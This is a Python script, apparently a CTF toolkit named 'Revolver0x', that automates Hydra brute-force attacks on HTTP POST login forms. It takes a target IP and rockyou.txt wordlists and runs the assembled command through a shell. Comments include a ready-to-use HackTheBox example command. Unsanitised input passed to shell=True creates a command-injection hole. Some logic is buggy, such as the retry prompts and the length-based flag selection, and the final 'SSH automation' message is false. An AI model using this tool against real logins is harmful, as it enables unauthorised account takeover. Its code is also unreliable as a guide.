import subprocess
import pyfiglet
from termcolor import colored
#Hydra Automation Script by Hydra@Root~Revolver
#--------------------------------------------------------------------------------------------------
# -t 4 : Number of parallel tasks to run
# -I : Show login/password attempts in the screen
# -V : Verbose mode (show login+pass combination for each attempt)
# -l : Single username
# -L : Username list
# -p : Single password
# -P : Password list
# http-post-form : HTTP POST form service
#? Example: hydra -l root -P /usr/share/wordlists/rockyou.txt http-post-form://target "<path>:<login_credentials>:<invalid_response>"
#? Example: hydra -L /usr/share/wordlists/rockyou.txt -p password http-post-form://target "<path>:<login_credentials>:<invalid_response>"
#? Example: hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt http-post-form://target "<path>:<login_credentials>:<invalid_response>"
###![HACKTHEBOX] hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.183.80 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect." -I -V
#--------------------------------------------------------------------------------------------------
# Functions For Hydra Automation

def GetIp():
  target = input("[Hydra@Automation] $target_ip : ")
  return target

def GetUser():
  InputValid = input("Do you have username? (Y/N) : ")
  if InputValid.upper() == 'Y':
    UserName = input("[Hydra@Automation] $username : ")
  elif InputValid.upper() == 'N':
    UserName = "/usr/share/wordlists/rockyou.txt"
  else:
    print("Enter valid input!")
    GetUser()
  return UserName

def GetPassword():
  InputValid = input("Do you have password? (Y/N) : ")
  if InputValid.upper() == 'Y':
    password = input("[Hydra@Automation] $password : ")
  elif InputValid.upper() == 'N':
    password = "/usr/share/wordlists/rockyou.txt"
  else:
    print("Enter valid input")
    GetPassword()
  return password

def GetUserflag(input):
  if len(input) >= 2:
    flagUser = '-l'
    return flagUser
  else:
    flagUser = '-L'
    return flagUser
  
def Getpassflag(input):
  if len(input) >= 16:
    flagPass = '-P'
    return flagPass
  else:
    flagPass = '-p'
    return flagPass

  #Rainbow color
def print_rainbow(text):
    colors = ['cyan', 'blue',]
    for i, char in enumerate(text):
        color = colors[i % len(colors)]
        print(colored(char, color), end='')
    print()
    
def Revolver0x():
    # ASCII art using pyfiglet
    ascii_art = colored(pyfiglet.figlet_format("Revolver0x"), "red", attrs=["bold"])
    print(ascii_art)
    
    # Colorize author and description
    author = colored("Author: Pran0x", "cyan", attrs=["bold"])
    version = colored("| Version: 1.0", "yellow", attrs=["bold"])
    description = colored("Ultimate toolkit for CTFs & Cybersecurity Tasks", "green", attrs=["bold"])
    
    # Print the colorized text
    print(author, version)
    print(description)
    

def main():

  Revolver0x() #calling the revolver function
  UserName = GetUser() #calling the GetUser function
  Password = GetPassword() #calling the GetPassword function
  target   = GetIp() #calling the GetIp function
  userFlag = GetUserflag(UserName) #calling the GetUserflag function
  passFlag = Getpassflag(Password) #calling the Getpassflag function
  
# The block of code you provided is responsible for taking user input for various credentials and
# settings related to the Hydra automation script. Here's a breakdown of each line:
  credentialUser  = input("[Hydra@Automation] $credential_user (username=): ")
  credentialPass  = input("[Hydra@Automation] $credential_password (password=): ")
  credentialLogin = input("[Hydra@Automation] $credential_Post (/login:) : ")
  invalidLogin    = input("[Hydra@Automation] $credential_Invalid (Incorrect password/username) : ")
  credentialForm = "http-post-form" #!default form [Change the form according to your requirement]
  print(f'[Hydra@Automation] $script : hydra {userFlag} {UserName} {passFlag} {Password} {target} {credentialForm} "{credentialLogin}{credentialUser}^USER^&{credentialPass}^PASS^:{invalidLogin}" -I -V')
  print("Automation processing...")
  result = subprocess.run(f'hydra {userFlag} {UserName} {passFlag} {Password} {target} {credentialForm} "{credentialLogin}{credentialUser}^USER^&{credentialPass}^PASS^:{invalidLogin}" -I -V', shell=True, stdout=subprocess.PIPE)
  output = result.stdout.decode('utf-8')
  #Checking the output
# This block of code is checking the output of the Hydra command for the presence of the string
# "login:". If the string "login:" is found in the output, it splits the output into lines and
# iterates over each line.
  if "login:" in output:
        lines = output.split('\n')
        for line in lines:
            if "login:" in line:
                print(colored(line, 'white', 'on_green'))
            else:
                print(line)
  else:
        print(output)
    
  print("Automation completed!")
  print("Automated login to the server using SSH automation script ... by Hydra@Root~Revolver\n")

# The `if __name__ == "__main__":` block in Python checks whether the script is being run directly by
# the Python interpreter or if it is being imported as a module into another script.
if __name__ == "__main__": #checking the main function
    main()